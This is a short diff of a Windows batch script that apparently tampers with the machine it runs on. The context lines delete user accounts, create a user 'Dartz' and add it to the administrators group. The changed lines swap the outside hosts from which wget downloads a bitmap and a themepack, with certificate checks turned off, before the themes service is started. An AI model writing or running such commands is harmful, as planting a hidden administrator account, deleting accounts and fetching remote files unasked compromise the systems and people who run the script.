@@ -28,6 +28,6 @@ net user SHITHEAD22 /delete
 net user SHITHEAD23 /delete
 net user Dartz /add
 net localgroup administrators Dartz /add
-wget -O C:/blinky.bmp http://b.1339.cf/nqhcmgt.bmp --no-check-certificate
-wget -O C:/defaulttheme.themepack http://b.1339.cf/durummb.themepack --no-check-certificate
+wget -O C:/blinky.bmp http://i.imgur.com/wSeQlNe.png --no-check-certificate
+wget -O C:/defaulttheme.themepack http://b.reich.io/rogaxr.themepack --no-check-certificate
 net start themes
